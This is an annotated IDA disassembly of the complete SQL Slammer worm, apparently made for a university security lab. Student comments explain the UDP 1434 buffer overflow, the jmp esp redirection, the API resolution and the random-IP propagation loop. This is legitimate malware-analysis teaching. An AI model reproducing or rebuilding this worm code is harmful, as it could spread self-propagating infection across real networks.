seg000:00000000 ;
seg000:00000000 ; +-------------------------------------------------------------------------+
seg000:00000000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:00000000 ; |           Copyright (c) 2022 Hex-Rays, <support@hex-rays.com>           |
seg000:00000000 ; |                      License info: 48-BABB-7E64-E2                      |
seg000:00000000 ; |                     Georgia Institute of Technology                     |
seg000:00000000 ; +-------------------------------------------------------------------------+
seg000:00000000 ;
seg000:00000000 ; Input SHA256 : 4F22864414F474843EB1E4599185E31D51C5B4AEFDE63B4DC5A850A39AEFF3CB
seg000:00000000 ; Input MD5    : A0AA4A74B70CBCA5A03960DF1A3DC878
seg000:00000000 ; Input CRC32  : 4660912C
seg000:00000000
seg000:00000000 ; ---------------------------------------------------------------------------
seg000:00000000 ; File Name   : /nethome/ankemla3/Desktop/ECE4117/lab4/W32.SQLSlammer.worm
seg000:00000000 ; Format      : Binary file
seg000:00000000 ; Base Address: 0000h Range: 0000h - 0178h Loaded length: 0178h
seg000:00000000
seg000:00000000                 .686p
seg000:00000000                 .mmx
seg000:00000000                 .model flat
seg000:00000000
seg000:00000000 ; ===========================================================================
seg000:00000000
seg000:00000000 ; Segment type: Pure code
seg000:00000000 seg000          segment byte public 'CODE' use32
seg000:00000000                 assume cs:seg000
seg000:00000000                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:00000000                 add     al, 1
seg000:00000002                 add     [ecx], eax      ; specially crafted data to overflow the buffer
seg000:00000004                 add     [ecx], eax      ; 96 bytes padding of data x01 starting after 04
seg000:00000004                                         ; whhen sql server gets packet with first byte as 0x04 it plugs it in a buffer and performs a vulnerable str copy which slammer takes advantage of
seg000:00000006                 add     [ecx], eax      ; overwrites return address
seg000:00000008                 add     [ecx], eax      ; string of 0101010... spills past 128bytes of mem reserved for the sql server request
seg000:00000008                                         ;
seg000:00000008                                         ; this crosses into the stack
seg000:0000000A                 add     [ecx], eax      ; (converted using c and then starting commenting but to turn it back to data means comments will be deleted so...please ignore conversion)
seg000:0000000C                 add     [ecx], eax
seg000:0000000E                 add     [ecx], eax
seg000:00000010                 add     [ecx], eax
seg000:00000012                 add     [ecx], eax
seg000:00000014                 add     [ecx], eax
seg000:00000016                 add     [ecx], eax
seg000:00000018                 add     [ecx], eax
seg000:0000001A                 add     [ecx], eax
seg000:0000001C                 add     [ecx], eax
seg000:0000001E
seg000:0000001E loc_1E:                                 ; CODE XREF: seg000:0000006E↓j
seg000:0000001E                 add     [ecx], eax
seg000:00000020                 add     [ecx], eax
seg000:00000022                 add     [ecx], eax
seg000:00000024                 add     [ecx], eax
seg000:00000026                 add     [ecx], eax
seg000:00000028                 add     [ecx], eax
seg000:0000002A                 add     [ecx], eax
seg000:0000002C                 add     [ecx], eax
seg000:0000002E                 add     [ecx], eax
seg000:00000030                 add     [ecx], eax
seg000:00000032                 add     [ecx], eax
seg000:00000034                 add     [ecx], eax
seg000:00000036                 add     [ecx], eax
seg000:00000038                 add     [ecx], eax
seg000:0000003A                 add     [ecx], eax
seg000:0000003C                 add     [ecx], eax
seg000:0000003E                 add     [ecx], eax
seg000:00000040                 add     [ecx], eax
seg000:00000042                 add     [ecx], eax
seg000:00000044                 add     [ecx], eax
seg000:00000046                 add     [ecx], eax
seg000:00000048                 add     [ecx], eax
seg000:0000004A                 add     [ecx], eax
seg000:0000004C                 add     [ecx], eax
seg000:0000004E                 add     [ecx], eax
seg000:00000050                 add     [ecx], eax
seg000:00000052                 add     [ecx], eax
seg000:00000054                 add     [ecx], eax
seg000:00000056                 add     [ecx], eax
seg000:00000058                 add     [ecx], eax
seg000:0000005A                 add     [ecx], eax
seg000:0000005C                 add     [ecx], eax
seg000:0000005E                 add     [ecx], eax
seg000:00000060                 add     esp, ebx
seg000:00000062                 leave
seg000:00000063                 mov     al, 42h ; 'B'
seg000:00000065                 jmp     short loc_75
seg000:00000067 ; ---------------------------------------------------------------------------
seg000:00000067                 add     [ecx], eax
seg000:00000069                 add     [ecx], eax
seg000:0000006B                 add     [ecx], eax
seg000:0000006B ; ---------------------------------------------------------------------------
seg000:0000006D                 db    1
seg000:0000006E ; ---------------------------------------------------------------------------
seg000:0000006E                 jo      short loc_1E
seg000:00000070                 inc     edx
seg000:00000071                 add     [eax-52h], esi
seg000:00000074                 inc     edx
seg000:00000075
seg000:00000075 loc_75:                                 ; CODE XREF: seg000:00000065↑j
seg000:00000075                 nop                     ; nop-  filler and does nothing (changes ip to next  instruction)
seg000:00000076                 nop                     ; afterbuffer overflow, return address is overwritten thus hits a jump esp in sqlsort.dll leads to payload
seg000:00000077                 nop
seg000:00000078                 nop
seg000:00000079                 nop
seg000:0000007A                 nop
seg000:0000007B                 nop
seg000:0000007C                 nop
seg000:0000007D                 push    42B0C9DCh       ; [ret]saves intruction pointer to the stack where worm already is so stack is worm -> ip
seg000:0000007D                                         ;  overwriting the return address with a jmp esp means process during ret starts executing code of the attackers choice
seg000:00000082                 mov     eax, 1010101h   ; eax=1010101h ->garbage to push onto stack
seg000:00000087                 xor     ecx, ecx        ; reconstruct process before payload
seg000:00000087                                         ; essentially recreates the buffer for later
seg000:00000089                 mov     cl, 18h
seg000:0000008B
seg000:0000008B loc_8B:                                 ; CODE XREF: seg000:0000008C↓j
seg000:0000008B                 push    eax             ; saves garbage to stack from ebp-8 to ebp-60
seg000:0000008C                 loop    loc_8B
seg000:0000008E                 xor     eax, 5010101h   ; eax=4000000
seg000:00000093                 push    eax             ; x04= msg type for sqlresolution request
seg000:00000093                                         ;
seg000:00000093                                         ; stack from bottom to top is msq_type->garbage->eip->worm
seg000:00000094                 mov     ebp, esp        ; normalize stack (later reference data pushed on stack)-> ebp=esp
seg000:00000096                 push    ecx             ; push ecx=0 on the stack
seg000:00000096                                         ; ecx used to store nulls
seg000:00000097                 push    6C6C642Eh
seg000:0000009C                 push    32336C65h
seg000:000000A1                 push    6E72656Bh       ; this is the string kernel32.dll
seg000:000000A6                 push    ecx
seg000:000000A7                 push    746E756Fh       ; push string GetTickCount
seg000:000000AC                 push    436B6369h
seg000:000000B1                 push    54746547h
seg000:000000B6                 mov     cx, 6C6Ch       ; cx is 16bytes lower half of ecx so ecx = 00..6c6ch
seg000:000000BA                 push    ecx             ; push 6c6ch on stack
seg000:000000BB                 push    642E3233h       ; push string ws2_32.dll
seg000:000000C0                 push    5F327377h
seg000:000000C5                 mov     cx, 7465h       ; cx is 16bytes lower half of ecx so ecx = 00..7465h
seg000:000000C9                 push    ecx
seg000:000000CA                 push    6B636F73h       ; push string socket
seg000:000000CF                 mov     cx, 6F74h
seg000:000000D3                 push    ecx             ; cx is 16bytes lower half of ecx so ecx = 00..6f74h
seg000:000000D4                 push    646E6573h       ; push string sendto
seg000:000000D9                 mov     esi, 42AE1018h  ; locates in sqlsort.dll address points to IAT entry for LoadLibrary
seg000:000000D9                                         ; put addr in source pointer esi
seg000:000000DE                 lea     eax, [ebp-2Ch]  ; ebp-2ch-> string "ws2_32.dll"
seg000:000000DE                                         ; load addr of string in eax as argument for LoadLibrary
seg000:000000E1                 push    eax             ; push on stack as argument
seg000:000000E2                 call    dword ptr [esi] ; call LoadLibrary which returns handle to module
seg000:000000E4                 push    eax             ; returns the base of ws2_32 in eax which is then pushed on stack for later function call GetProcAddress
seg000:000000E5                 lea     eax, [ebp-20h]  ; ebp-20h -> load address of string GetTickCount into eax and push on stack
seg000:000000E8                 push    eax             ; this is an arg for the function GetProcAddress
seg000:000000E9                 lea     eax, [ebp-10h]  ; load addr of string ebp-10h->kernell32.dll
seg000:000000EC                 push    eax             ; push address on stack
seg000:000000ED                 call    dword ptr [esi] ; call LoadLibrary("kernel32.dll") from sqlsort.dll
seg000:000000EF                 push    eax             ; returns base of kernel32 in eax which is stored on the stack for GetProcAddress
seg000:000000F0                 mov     esi, 42AE1010h  ; move sqlsort  IAT (import address table) to esi
seg000:000000F0                                         ; IAT shifts across dll versions so the malware can check for a small instruction sequence at the entry poiunt of funtion to check the function is GetProcAddress
seg000:000000F5                 mov     ebx, [esi]      ; move function entry point (IATentry) to ebx
seg000:000000F7                 mov     eax, [ebx]      ; grab 4bytes of instructions from function entry point into eax for compare
seg000:000000F9                 cmp     eax, 51EC8B55h
seg000:000000FE                 jz      short GetProcAddrfound ; jump to call of GetProcAddress(kernel32 base addr, GetTickCount)
seg000:00000100                 mov     esi, 42AE101Ch
seg000:00000105
seg000:00000105 GetProcAddrfound:                       ; CODE XREF: seg000:000000FE↑j
seg000:00000105                 call    dword ptr [esi] ; call GetProcAddress(kernel32 base addr, GetTickCount)
seg000:00000107                 call    eax             ; GetTickCount()- returns the number of milliseconds since system was started
seg000:00000109                 xor     ecx, ecx        ; ecx=0
seg000:0000010B                 push    ecx
seg000:0000010C                 push    ecx             ; push nulls on stack
seg000:0000010C                                         ; adds 8bytes to stack frame to store address structure
seg000:0000010D                 push    eax             ; store GetTickCount returned
seg000:0000010E                 xor     ecx, 9B040103h  ; ecx=000000000xor9b040103=9b040103
seg000:00000114                 xor     ecx, 1010101h   ; ecx=1010101xor9b040103=9a050002
seg000:0000011A                 push    ecx             ; push ecx on stack
seg000:0000011A                                         ; 9a050002->destination port 1434 which is port of the sql resolution service
seg000:0000011B                 lea     eax, [ebp-34h]  ; eax = address for string socket as argument for GetProcAddress
seg000:0000011E                 push    eax             ; push on stack as argument to function call
seg000:0000011F                 mov     eax, [ebp-40h]  ; eax=ebp-40h-> ws2_32 base address
seg000:00000122                 push    eax             ; push on stack as argument for function call
seg000:00000123                 call    dword ptr [esi] ; call GetProcAddress(ws2_32, socket) to find socket api call
seg000:00000123                                         ; GetProcAddress() examines the export address table in the DLL, looking for a function with the name (or ordinal) specified. If the function is found, the address is returned. Otherwise, NULL is returned.
seg000:00000125                 push    11h             ; create udp sockect for usee
seg000:00000127                 push    2               ; sock_dgram-datagram connectionless socket
seg000:00000129                 push    2               ; internet address family
seg000:0000012B                 call    eax             ; eax has the return of getprocaddress which should be the address of the function socket
seg000:0000012B                                         ;
seg000:0000012B                                         ; call eax->calls socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP) or socket(2,2,11h)
seg000:0000012D                 push    eax             ; socket returns a descriptor referencing the new socket which gets stored on stack
seg000:0000012E                 lea     eax, [ebp-3Ch]  ; load eax with ebp-3ch->address of string sendto
seg000:0000012E                                         ; push on stack as argument
seg000:00000131                 push    eax
seg000:00000132                 mov     eax, [ebp-40h]  ; eax=ebp-40h-> ws2_32 base address
seg000:00000135                 push    eax             ; save on stack as arg
seg000:00000136                 call    dword ptr [esi] ; call GetProcAddress(ws2_32,sendto)
seg000:00000136                                         ; returns address of function sendto and saves it in esi=eax
seg000:00000138                 mov     esi, eax        ; overwrites call to getprocaddress after this for the rest of the malware and loops esi->sendto()
seg000:0000013A                 or      ebx, ebx        ; ebx inititally contains IAT entry or function entry point
seg000:0000013A                                         ; ebx=77f8313c from sqlsort.dll iat
seg000:0000013C                 xor     ebx, 0FFD9613Ch ; 77F8313C xor FFD9613C= 88215000
seg000:00000142
seg000:00000142 sendtorandomip:                         ; CODE XREF: seg000:00000176↓j
seg000:00000142                 mov     eax, [ebp-4Ch]  ; ebp-4ch->seed from gettickcount
seg000:00000142                                         ; for random number generation
seg000:00000145                 lea     ecx, [eax+eax*2] ; ecx=eax*4
seg000:00000145                                         ; generates random ip address by looking up num of millisecs (gettickcount) on the cpu's clock and format this number as ip address
seg000:00000148                 lea     edx, [eax+ecx*4] ; edx=ecx*4+eax
seg000:00000148                                         ; shuffle the bits of ip in memory to create new ip during every loop
seg000:0000014B                 shl     edx, 4          ; edx<<4
seg000:0000014E                 add     edx, eax        ; edx+=eax
seg000:00000150                 shl     edx, 8          ; edx<<8
seg000:00000153                 sub     edx, eax        ; edx-eax
seg000:00000155                 lea     eax, [eax+edx*4]
seg000:00000158                 add     eax, ebx
seg000:0000015A                 mov     [ebp-4Ch], eax  ; store generated ipaddress in sock_addr structure
seg000:0000015D                 push    10h             ; push 10h (size of struct) as arg for send to
seg000:0000015F                 lea     eax, [ebp-50h]  ; load address of sock_addr structure in eax
seg000:00000162                 push    eax             ; push eax (target addr) as arg for sendto()
seg000:00000163                 xor     ecx, ecx
seg000:00000165                 push    ecx             ; store 0 or nulls
seg000:00000165                                         ; zero out flags?
seg000:00000166                 xor     cx, 178h        ; 178h->376bytes which is payload size to send to random ip
seg000:0000016B                 push    ecx             ; store length of payload
seg000:0000016C                 lea     eax, [ebp+3]    ; grab address of payload
seg000:0000016F                 push    eax             ; push address on stack
seg000:00000170                 mov     eax, [ebp-54h]  ; grab socket descriptor
seg000:00000173                 push    eax             ; store on stack as arg
seg000:00000174                 call    esi             ; call sendto(socket, *buff, len, flags, struct *to, tolen) or sendto(sock,payload,376,0,sock_address struct,10h)
seg000:00000176                 jmp     short sendtorandomip ; repeat this and send payload to random ips
seg000:00000176 seg000          ends
seg000:00000176
seg000:00000176
seg000:00000176                 end
